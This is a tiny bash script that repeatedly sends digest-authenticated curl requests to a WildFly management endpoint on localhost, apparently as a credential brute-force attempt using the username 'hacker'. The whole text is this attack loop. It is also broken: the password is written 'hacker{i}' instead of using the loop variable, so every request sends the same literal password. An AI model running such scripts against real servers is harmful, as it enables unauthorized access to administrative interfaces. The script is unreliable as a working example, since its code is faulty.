for i in {1..50}
do
echo "Attempting to access wildfly server"
curl http://localhost:9990/management --digest -u hacker:hacker{i}
sleep 2
done
